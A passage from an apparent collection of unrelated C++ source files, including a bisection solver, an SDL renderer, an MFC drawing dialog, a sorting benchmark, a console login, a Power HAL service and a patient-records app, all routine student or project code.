));\r\n\t}\r\n\treturn ret;\r\n}\r\n\r\nvoid paintMenu(Menu &menu, const Task &subtask, const short &delt, const short &i) {\r\n\tmenu.clear();\r\n\tmenu.push(Button({0, (short)(delt + 0)}, \"[-]\", \"4\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({4, (short)(delt + 0)}, \"\u6587\u4ef6\u8def\u5f84\uff1a\" + subtask.path, \"0\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({4, (short)(delt + 1)}, \"\u89e6\u53d1\u6b21\u6570\uff1a\" + to_string(subtask.trigger_count), \"1\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({4, (short)(delt + 2)}, \"\u89e6\u53d1\u95f4\u9694\uff1a\" + to_string(subtask.trigger_interval) + \"ms\", \"2\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({4, (short)(delt + 3)}, \"\u5524\u9192\u89e6\u53d1\uff1a\" + (subtask.auto_trigger ? (string)\"\u5141\u8bb8\" : (string)\"\u7981\u6b62\"), \"3\" + to_string(i), ButtonColor(consoleColor.brightCyan), true, true));\r\n}\r\nvoid paintMenu(Menu &menu, const Config &config, const string &config_path) {\r\n\tmenu.clear();\r\n\r\n\tmenu.push(Button({0, 0}, \"\u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u5668 - \" + config_path, \"title\", ButtonColor(consoleColor.White), true, true));\r\n\tmenu.push(Button({0, 1}, \"\u64a4\u9500\u4e0a\u6b21\u4fee\u6539\", \"back\", ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({0, 2}, \"\u56de\u9000\u81f3\u542f\u52a8\u65f6\", \"backtobeg\", ButtonColor(consoleColor.brightCyan), true, true));\r\n\tmenu.push(Button({0, 3}, \"\u4fdd\u5b58\u5e76\u9000\u51fa\", \"exit\", But",
    "#include \"Bisection.h\"\r\n#include <iostream>\r\n#include <iomanip>\r\n#include <math.h>\r\n\r\nusing namespace std;\r\n\r\ndouble my_func(double x)\r\n{\r\n\treturn sin(x);\r\n}\r\n\r\ndouble my_func2(double x)\r\n{\r\n\treturn x * x * x - sin(x);\r\n}\r\n\r\nint main()\r\n{\r\n\tBisection b(0, 3, 1E-5); //Instantiating with [0,3] interval, and tolerance 0.00001\r\n\tdouble root = b.findRoot(); //Firstly checking the default function\r\n\tcout << fixed << setprecision(10);\r\n\tcout << \"The root for the default function sin^2(x) + x^3 - exp(x) is : \" << root << endl;\r\n\tb.setTolerance(1E-10);\r\n\troot = b.findRoot(); \r\n\tcout << \"\\nThe root value is now :\" << root << endl; //With our new tolerances\r\n\t//Trying again, with two new functions\r\n\tb.setBracket(3, 4);\r\n\troot = b.findRoot(my_func);\r\n\tcout << \"\\nThe root for sin(x) in the range [3,4] is : \" << root << endl;\r\n\tb.setBracket(0.5, 1.5);\r\n\troot = b.findRoot(my_func2);\r\n\tcout << \"\\nThe root for x^3 - sin(x) in range [0.5,1.5] is : \" << root << endl;\r\n\tsystem(\"PAUSE\"); \r\n\r\n\treturn EXIT_SUCCESS;\r\n}",
    "#include \"cuda_runtime_api.h\"\n#include <iostream>\n\n#include <rmm/device_buffer.hpp>\n#include <kvikio/file_handle.hpp>\n\nint main(int argc, char** argv) {\n\n  try {\n    RMM_CUDA_TRY(cudaSetDevice(0));\n    auto mr = rmm::mr::cuda_memory_resource{};\n    rmm::device_buffer buf(10, rmm::cuda_stream_default, &mr);\n\n    std::cout << \"Buffer has \" << buf.size() << \" bytes worth data\" << std::endl;\n\n    auto col1_dev_ptr = buf.data();\n    size_t size = buf.size();\n    off_t file_offset = 0;\n    off_t devptr_offset = 0;\n    ssize_t bytes_written = 0;\n\n    kvikio::FileHandle file_handle(argv[1], \"w\", kvikio::FileHandle::m644, false);\n    file_handle.write_async((char*)col1_dev_ptr, &size, &file_offset, &devptr_offset, &bytes_written, 0);\n    std::cout << \"Write requested for \" << size << \" bytes\" << std::endl;\n    RMM_CUDA_TRY(cudaStreamSynchronize(0));\n    std::cout << \"Write Async ended up writing \" << bytes_written << \" bytes\" << std::endl;\n    if (bytes_written < 0) {\n      throw std::runtime_error(CUFILE_ERRSTR(abs(bytes_written)+CUFILEOP_BASE_ERR));\n    }\n  } catch (std::exception &e) {\n    std::cout << \"Error: \" << e.what() << std::endl;\n    exit(-1);\n  }\n\n  return 0;\n}\n",
    "#include \"../Sources/AllUsers.h\"\nAllUsers::AllUsers() { ind = 0; };\nAllUsers::~AllUsers(){};\nUser *AllUsers::Search(string find_Email)\n{\n    for (int i = 0; i < All_Users.size(); i++)\n    {\n        if (All_Users[i]->Get_Email() == find_Email)\n        {\n            return All_Users[i];\n        }\n    }\n    return nullptr;\n}\n\nUser *AllUsers::CreateUser(string e, string pw, string n, int a, int num, bool admin)\n{\n    User *temp = new User(n, a, e, pw, num, admin);\n    All_Users.push_back(temp);\n    ind++;\n    return temp;\n}\n\nvoid AllUsers::save()\n{\n    ofstream save(\"allusers.dat\", std::ios::trunc);\n    save.close();\n    for (int i = 0; i < All_Users.size(); i++)\n    {\n        All_Users[i]->save();\n        if (i < ind - 1)\n        {\n            save.open(\"allusers.dat\", ios::app);\n            save << endl;\n            save.close();\n        }\n    }\n}\n\nvoid AllUsers::Display()\n{\n    for (int i = 0; i < All_Users.size(); i++)\n    {\n        All_Users[i]->User_Display();\n    }\n}\n\nvoid AllUsers::removeuser(int id)\n{\n    for (size_t i = 0; i < All_Users.size(); i++)\n    {\n        if (All_Users[i]->Get_ID() == id)\n        {\n            id = i;\n            break;\n        }\n    }\n    All_Users.erase(All_Users.begin() + id);\n}\n\nvoid AllUsers::load()\n{\n    int tempID;\n    string tempName;\n    string tempEmail;\n    string tempPassword;\n    int tempPhone_Number;\n    int tempAge;\n    int walletind;\n    bool tempAdmin;\n    // Ewallets temp variables\n    string card_name;\n    float card_balance;\n    int card_CVV;\n    int Card_Number;\n\n    ifstream load;\n    load.open(\"allusers.dat\");\n    while (load >> tempName)\n    {\n\n        load >> tempEmail;\n        load >> tempPassword;\n        load >> tempID;\n        load >> tempAge;\n        load >> tempPhone_Number;\n        load >> tempAdmin;\n        load >> walletind;\n        CreateUser(tempEmail, tempPassword, tempName, tempAge, tempPhone_Number, tempAdmin);\n        for (int i = 0; i < walletind; i++)\n        {\n            load >> card_name;\n            load >> card_balance;\n            load >> Card_Number;\n            load >> card_CVV;\n            All_Users[tempID]->Add_Credit_card(card_name, card_balance, card_CVV, Card_Number);\n        }\n    }\n    load.close();\n}\n",
    "#include <iostream>\n#include <string>\n#include \"RenderWindow.hpp\"\n#include \"Entity.hpp\"\n#include \"SDL_render.h\"\n\nRenderWindow:: RenderWindow(const char *title, int w, int h) {\n    window_ = SDL_CreateWindow(title, SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, w, h, SDL_WINDOW_SHOWN);\n\n    if (window_ == nullptr) {\n        throw std::runtime_error{\"SDL_CreateWindow() failed: \" + std::string(SDL_GetError())};\n    }\n\n    renderer_ = SDL_CreateRenderer(window_, -1, SDL_RENDERER_ACCELERATED);\n}\n\nSDL_Texture *RenderWindow:: load_texture(const char *file_path) {\n    SDL_Texture *texture = nullptr;\n    texture = IMG_LoadTexture(renderer_, file_path);\n\n    if (texture == nullptr) {\n        throw std::runtime_error{\"IMG_LoadTexture() failed: \" + std::string(SDL_GetError())};\n    }\n\n    return texture;\n}\n\nvoid RenderWindow:: clear() {\n    SDL_RenderClear(renderer_);\n}\n\nvoid RenderWindow:: render(const Entity &entity) {\n\n    SDL_Rect src;\n    src.x = entity.get_curr_frame().x;\n    src.y = entity.get_curr_frame().y;\n    src.w = entity.get_curr_frame().w;\n    src.h = entity.get_curr_frame().h;\n\n    SDL_Rect dst;\n    Vector2f pos = entity.get_pos();\n    dst.x = pos.x;\n    dst.y = pos.y;\n    dst.w = entity.get_curr_frame().w * 4;\n    dst.h = entity.get_curr_frame().h * 4;\n    \n    SDL_RenderCopy(renderer_, entity.get_tex(), &src, &dst);\n}\n\nvoid RenderWindow:: display() {\n    SDL_RenderPresent(renderer_);\n}\n\nRenderWindow:: ~RenderWindow() {\n    SDL_DestroyWindow(window_);\n}\n",
    "\ufeff\n// MyTestDlg.cpp: \u5b9e\u73b0\u6587\u4ef6\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"MyTest.h\"\n#include \"MyTestDlg.h\"\n#include \"afxdialogex.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n\n// \u7528\u4e8e\u5e94\u7528\u7a0b\u5e8f\u201c\u5173\u4e8e\u201d\u83dc\u5355\u9879\u7684 CAboutDlg \u5bf9\u8bdd\u6846\n\nclass CAboutDlg : public CDialogEx\n{\npublic:\n\tCAboutDlg();\n\n// \u5bf9\u8bdd\u6846\u6570\u636e\n#ifdef AFX_DESIGN_TIME\n\tenum { IDD = IDD_ABOUTBOX };\n#endif\n\n\tprotected:\n\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV \u652f\u6301\n\n// \u5b9e\u73b0\nprotected:\n\tDECLARE_MESSAGE_MAP()\n};\n\nCAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)\n{\n}\n\nvoid CAboutDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n}\n\nBEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)\nEND_MESSAGE_MAP()\n\n\n// CMyTestDlg \u5bf9\u8bdd\u6846\n\n\n\nCMyTestDlg::CMyTestDlg(CWnd* pParent /*=nullptr*/)\n\t: CDialogEx(IDD_MYTEST_DIALOG, pParent)\n\t, m_time(_T(\"\"))\n{\n\tm_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);\n}\n\nvoid CMyTestDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n\tDDX_Text(pDX, IDC_EDIT1, m_time);\n}\n\nBEGIN_MESSAGE_MAP(CMyTestDlg, CDialogEx)\n\tON_WM_SYSCOMMAND()\n\tON_WM_PAINT()\n\tON_WM_QUERYDRAGICON()\n\tON_WM_TIMER()\n\tON_BN_CLICKED(IDC_BUTTON1, &CMyTestDlg::OnBnClickedButton1)\n\tON_BN_CLICKED(IDC_BUTTON2, &CMyTestDlg::OnBnClickedButton2)\n\tON_WM_DESTROY()\nEND_MESSAGE_MAP()\n\n\n// CMyTestDlg \u6d88\u606f\u5904\u7406\u7a0b\u5e8f\n\nBOOL CMyTestDlg::OnInitDialog()\n{\n\tCDialogEx::OnInitDialog();\n\n\t// \u5c06\u201c\u5173\u4e8e...\u201d\u83dc\u5355\u9879\u6dfb\u52a0\u5230\u7cfb\u7edf\u83dc\u5355\u4e2d\u3002\n\n\t// IDM_ABOUTBOX \u5fc5\u987b\u5728\u7cfb\u7edf\u547d\u4ee4\u8303\u56f4\u5185\u3002\n\tASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);\n\tASSERT(IDM_ABOUTBOX < 0xF000);\n\n\tCMenu* pSysMenu = GetSystemMenu(FALSE);\n\tif (pSysMenu != nullptr)\n\t{\n\t\tBOOL bNameValid;\n\t\tCString strAboutMenu;\n\t\tbNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);\n\t\tASSERT(bNameValid);\n\t\tif (!strAboutMenu.IsEmpty())\n\t\t{\n\t\t\tpSysMenu->AppendMenu(MF_SEPARATOR);\n\t\t\tpSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);\n\t\t}\n\t}\n\n\t// \u8bbe\u7f6e\u6b64\u5bf9\u8bdd\u6846\u7684\u56fe\u6807\u3002  \u5f53\u5e94\u7528\u7a0b\u5e8f\u4e3b\u7a97\u53e3\u4e0d\u662f\u5bf9\u8bdd\u6846\u65f6\uff0c\u6846\u67b6\u5c06\u81ea\u52a8\n\t//  \u6267\u884c\u6b64\u64cd\u4f5c\n\tSetIcon(m_hIcon, TRUE);\t\t\t// \u8bbe\u7f6e\u5927\u56fe\u6807\n\tSetIcon(m_hIcon, FALSE);\t\t// \u8bbe\u7f6e\u5c0f\u56fe\u6807\n\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u989d\u5916\u7684\u521d\u59cb\u5316\u4ee3\u7801\n\n\tdx = 0;\n\tdy = 0;\n\n\tCRect rc;\n\tGetClientRect(rc);\n\n\t//\u5efa\u7acb\u8bbe\u5907DC\n\tm_pDC = new CClientDC(this);\n\n\t//\u5efa\u7acb\u5185\u5b58DC\n\tm_pMemDC = new CDC;\n\tm_pMemDC->CreateCompatibleDC(m_pDC);\n\n\t//\u5efa\u7acb\u5185\u5b58\u4f4d\u56fe\n\tm_pMemBitmap = new CBitmap;\n\tm_pMemBitmap->CreateCompatibleBitmap(m_pDC, rc.Width(), rc.Height());\n\n\t//\u5c06\u4f4d\u56fe\u9009\u5165\u5185\u5b58DC\n\tm_pMemDC->SelectObject(m_pMemBitmap);\n\n\treturn TRUE;  // \u9664\u975e\u5c06\u7126\u70b9\u8bbe\u7f6e\u5230\u63a7\u4ef6\uff0c\u5426\u5219\u8fd4\u56de TRUE\n}\n\nvoid CMyTestDlg::OnSysCommand(UINT nID, LPARAM lParam)\n{\n\tif ((nID & 0xFFF0) == IDM_ABOUTBOX)\n\t{\n\t\tCAboutDlg dlgAbout;\n\t\tdlgAbout.DoModal();\n\t}\n\telse\n\t{\n\t\tCDialogEx::OnSysCommand(nID, lParam);\n\t}\n}\n\n// \u5982\u679c\u5411\u5bf9\u8bdd\u6846\u6dfb\u52a0\u6700\u5c0f\u5316\u6309\u94ae\uff0c\u5219\u9700\u8981\u4e0b\u9762\u7684\u4ee3\u7801\n//  \u6765\u7ed8\u5236\u8be5\u56fe\u6807\u3002  \u5bf9\u4e8e\u4f7f\u7528\u6587\u6863/\u89c6\u56fe\u6a21\u578b\u7684 MFC \u5e94\u7528\u7a0b\u5e8f\uff0c\n//  \u8fd9\u5c06\u7531\u6846\u67b6\u81ea\u52a8\u5b8c\u6210\u3002\n\nvoid CMyTestDlg::OnPaint()\n{\n\tif (IsIconic())\n\t{\n\t\tCPaintDC dc(this); // \u7528\u4e8e\u7ed8\u5236\u7684\u8bbe\u5907\u4e0a\u4e0b\u6587\n\n\t\tSendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);\n\n\t\t// \u4f7f\u56fe\u6807\u5728\u5de5\u4f5c\u533a\u77e9\u5f62\u4e2d\u5c45\u4e2d\n\t\tint cxIcon = GetSystemMetrics(SM_CXICON);\n\t\tint cyIcon = GetSystemMetrics(SM_CYICON);\n\t\tCRect rect;\n\t\tGetClientRect(&rect);\n\t\tint x = (rect.Width() - cxIcon + 1) / 2;\n\t\tint y = (rect.Height() - cyIcon + 1) / 2;\n\n\t\t// \u7ed8\u5236\u56fe\u6807\n\t\tdc.DrawIcon(x, y, m_hIcon);\n\t}\n\telse\n\t{\n\t\tLARGE_INTEGER start, end, freq;\n\t\tQueryPerformanceFrequency(&freq);  // \u83b7\u53d6\u8ba1\u6570\u5668\u7684\u9891\u7387\n\t\tQueryPerformanceCounter(&start);  // \u5f00\u59cb\u8ba1\u65f6\n\t\t\n\t\tCRect rect;\n\t\tGetClientRect(&rect);\n\n\t\t// \u5148\u5728\u5185\u5b58\u4e2d\u7ed8\u5236\u5185\u5bb9\n\n\t\t// \u6a21\u62df\u8ba1\u7b97\n\t\tfor (int i = 0; i < 1000000000; i++)\n\t\t{\n\n\t\t}\n\n\t\t// \u521b\u5efa\u4e00\u4e2a\u753b\u5237\uff0c\u8bbe\u5b9a\u4e3a\u6de1\u84dd\u8272\u80cc\u666f\n\t\tCBrush brush(RGB(173, 216, 230)); // \u4f8b\u5982\uff1a\u6de1\u84dd\u8272\n\n\t\t// \u586b\u5145\u5bf9\u8bdd\u6846\u80cc\u666f\n\t\tm_pMemDC->FillRect(rect, &brush);\n\n\t\t// \u7ed8\u5236\u968f\u65f6\u95f4\u79fb\u52a8\u7684\u77e9\u5f62\n\t\tm_pMemDC->Rectangle(50 + dx * 10, 50 + dy * 10, 100 + dx * 10, 100 + dy * 10);\n\n\t\t// \u5c06\u5185\u5b58\u4e2d\u7684\u5185\u5bb9\u4e00\u6b21\u6027\u7ed8\u5236\u5230\u5c4f\u5e55\u4e0a\n\t\tm_pDC->BitBlt(0, 0, rect.Width(), rect.Height(), m_pMemDC, 0, 0, SRCCOPY);\n\n\n\t\tQueryPerformanceCounter(&end);  // \u7ed3\u675f\u8ba1\u65f6\n\t\tdouble elapsed = static_cast<double>(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000.0;  // \u8ba1\u7b97\u7ecf\u8fc7\u7684\u65f6\u95f4\uff08\u6beb\u79d2\uff09\n\t\tm_time.Format(_T(\"%.3f milliseconds\"), elapsed);\n\t\tUpdateData(FALSE);\n\n\t\tCDialogEx::OnPaint();\n\t}\n}\n\n//\u5f53\u7528\u6237\u62d6\u52a8\u6700\u5c0f\u5316\u7a97\u53e3\u65f6\u7cfb\u7edf\u8c03\u7528\u6b64\u51fd\u6570\u53d6\u5f97\u5149\u6807\n//\u663e\u793a\u3002\nHCURSOR CMyTestDlg::OnQueryDragIcon()\n{\n\treturn static_cast<HCURSOR>(m_hIcon);\n}\n\n\n\nvoid CMyTestDlg::OnTimer(UINT_PTR nIDEvent)\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u6d88\u606f\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\u548c/\u6216\u8c03\u7528\u9ed8\u8ba4\u503c\n\n\tdx++;\n\tdy++;\n\n\t//Invalidate(TRUE);\t// \u6e05\u9664\u753b\u677f\u518d\u753b\n\tInvalidate(FALSE);\t//\u4e0d\u6e05\u9664\u753b\u677f\uff0c\u76f4\u63a5\u753b\n\n\tCDialogEx::OnTimer(nIDEvent);\n}\n\n\nvoid CMyTestDlg::OnBnClickedButton1()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tSetTimer(1, 1000, NULL);\n}\n\n\nvoid CMyTestDlg::OnBnClickedButton2()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tKillTimer(1);\n}\n\nvoid CMyTestDlg::OnDestroy()\n{\n\tCDialogEx::OnDestroy();\n\n\t// TODO: \u5728\u6b64\u5904\u6dfb\u52a0\u6d88\u606f\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tdelete m_pMemDC;\n\tdelete m_pDC;\n\tdelete m_pMemBitmap;\n}\n",
    "#include <chrono>\n#include <iostream>\n#include <unistd.h>\n#include <numeric>\n#include <algorithm>\n#include <vector>\n#include \"SortingAlgorithm.hpp\"\n#include <iomanip>\n\nusing namespace std;\n\ntemplate<typename T>\ndouble TimeBubble(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::BubbleSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\ntemplate<typename T>\ndouble TimeMerge(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::MergeSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\n\nint main(int argc, char ** argv)\n{\n    int n = 0;\n    size_t dimv = stoi(argv[1]);\n    unsigned int iters = 100;\n    vector<int> v(dimv);\n    double time_Bubble = 0;\n    double time_Merge = 0;\n\n    cout << scientific << setprecision(4);\n    // Vector of random integers in range 0-987\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            v[i] = rand() % 987;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v = time_Bubble/iters;\n    double time_MergeSort_v = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v << endl\n         << \"MergeSort : \" << time_MergeSort_v << endl << endl;\n\n\n    // Vector of random doubles in range 0-1\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    vector<double> w(dimv);\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            w[i] = rand();\n        }\n        vector<double> w_copia = w;\n\n        time_Bubble += TimeBubble(w);\n        time_Merge += TimeMerge(w_copia);\n    }\n    double time_BubbleSort_w = time_Bubble/iters;\n    double time_MergeSort_w = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random doubles vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_w << endl\n         << \"MergeSort : \" << time_MergeSort_w << endl << endl;\n\n\n    // Vector of ascending ordered integers\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    vector<int> v_copia = v;\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v3 = time_Bubble/iters;\n    double time_MergeSort_v3 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a ordered integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v3 << endl\n         << \"MergeSort : \" << time_MergeSort_v3 << endl << endl;\n\n\n    unsigned int half_dim = dimv/2;\n    // Vector of ordered integers with the fist half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<half_dim; i++){\n            v[i] = rand() % half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v1 = time_Bubble/iters;\n    double time_MergeSort_v1 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the fist half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v1 << endl\n         << \"MergeSort : \" << time_MergeSort_v1 << endl << endl;\n\n\n    // Vector of ordered integers with the second half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=half_dim; i<dimv; i++){\n            v[i] = rand() % dimv + half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v2 = time_Bubble/iters;\n    double time_MergeSort_v2 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the second half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v2 << endl\n         << \"MergeSort : \" << time_MergeSort_v2 << endl << endl;\n\n\n    // Vector of ordered integers which elements have been switched in pairs\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    int dimv_floor = (dimv/2)*2;\n    for (unsigned int ",
    "#include <iostream>\r\n#include <cstring>\r\nusing namespace std;\r\n\r\nint main(){\r\n\t\r\n\tchar email[50], emaillogin[50];\r\n\tchar senha[50], senhalogin[50];\r\n\tchar senha1[50];\r\n\tint aux = 0;\r\n\tint result, resultlogin, resultpass;\r\n\t\r\n\twhile(1)\r\n\t{\r\n\t\t\r\n\t\twhile(aux == 0)\r\n\t\t{\r\n\t\t\t\r\n\t\t\tcin.getline(email,50);\r\n\t\t\tcin.getline(senha,50);\r\n\t\t\tcin.getline(senha1,50);\r\n\t\t\t\r\n\t\t\tstrcmp(senha,senha1);\r\n\t\t\tresult = strcmp(senha,senha1);\r\n\t\t\r\n\t\t\tif (result != 0)\r\n\t\t\t{\r\n\t\t\t\tcout << \"As senhas nao correspondem.\" << endl;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\telse if (result == 0)\r\n\t\t\t{\r\n\t\t\t\taux += 1;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}\t\r\n\t\t\r\n\t\tcout << \"login\" << endl;\r\n\t\tcin.getline(emaillogin,50);\r\n\t\tstrcmp(email, emaillogin);\r\n\t\tresultlogin = strcmp(email, emaillogin);\r\n\t\t\r\n\t\tif (resultlogin == 0)\r\n\t\t{\r\n\t\t\tcout << \"senha\" << endl;\t\r\n\t\t}\r\n\t\t\r\n\t\tcin.getline(senhalogin,50);\r\n\t\tstrcmp(senha, senhalogin);\r\n\t\tresultpass = strcmp(senha, senhalogin);\r\n\t\t\r\n\t\tif (resultpass == 0)\r\n\t\t{\r\n\t\t\tcout << \"login validado\" << endl;\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\t\t\r\n\t\t\r\n\t\t\t\r\n\t}\r\n\t\r\n\treturn 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"getx_todo_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * Copyright (C) 2020 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.power@1.3-service.xiaomi_sm6250\"\n\n#include <hidl/HidlTransportSupport.h>\n\n#include \"Power.h\"\n\nusing android::sp;\nusing android::status_t;\nusing android::OK;\n\nusing android::hardware::configureRpcThreadpool;\nusing android::hardware::joinRpcThreadpool;\n\nusing ::android::hardware::power::V1_3::IPower;\nusing ::android::hardware::power::V1_3::implementation::Power;\n\nint main() {\n    ALOGI(\"Power HAL 1.3 service is starting\");\n\n    sp<IPower> service = new Power();\n    if (service == nullptr) {\n        ALOGE(\"Failed to create an instance of Power HAL, exiting\");\n        return 1;\n    }\n    configureRpcThreadpool(1, true /* callerWillJoin */);\n\n    status_t status = service->registerAsService();\n    if (status != OK) {\n        ALOGE(\"Failed to register service for Power HAL, exiting\");\n        return 1;\n    }\n\n    ALOGI(\"Power HAL service is ready\");\n    joinRpcThreadpool();\n\n    // In normal operation, we don't expect the thread pool to exit\n    ALOGE(\"Power HAL service is shutting down\");\n    return 1;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\nusing namespace std;\r\n\r\nstruct DietPlan \r\n{\r\n    std::string description;\r\n};\r\n\r\n\r\nstruct ExercisePlan \r\n{\r\n    std::string description;\r\n};\r\n\r\nstruct Doctor \r\n{\r\n    std::string name;\r\n    std::string contactNumber;\r\n};\r\n\r\nstruct Patient \r\n{\r\n    std::string name;\r\n    std::string enrollmentDate;\r\n    std::string contactNumber;\r\n    std::string disease;\r\n    std::string pregnancyWeeks;\r\n    std::string height;\r\n    std::string weight;\r\n    Doctor attendingDoctor;\r\n};\r\nstruct EmergencyContacts\r\n{\r\n\tstd::string name;\r\n\tstd::string contactNumber;\r\n};\r\n\r\nvoid displayDoctors(const std::vector<Doctor>& doctors);\r\nvoid bookAppointment(const Doctor& doctor);\r\nvoid viewPatientInfo(const std::vector<Patient>& patients);\r\nvoid viewPatientInfoIndex(const std::vector<Patient>& patients, int patientChoice);\r\nvoid viewDietPlanForPregnancy();\r\nvoid displayEmergencyContacts(const std::vector<EmergencyContacts>& contacts);\r\n\r\nint main() \r\n{\r\n    std::vector<Doctor> nearbyDoctors;\r\n    nearbyDoctors.push_back({\"Dr. Khurana\", \"789-222-3333\"});\r\n    nearbyDoctors.push_back({\"Dr. Arora\", \"987-333-4444\"});\r\n    nearbyDoctors.push_back({\"Dr. Sharma\", \"986-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Menon\", 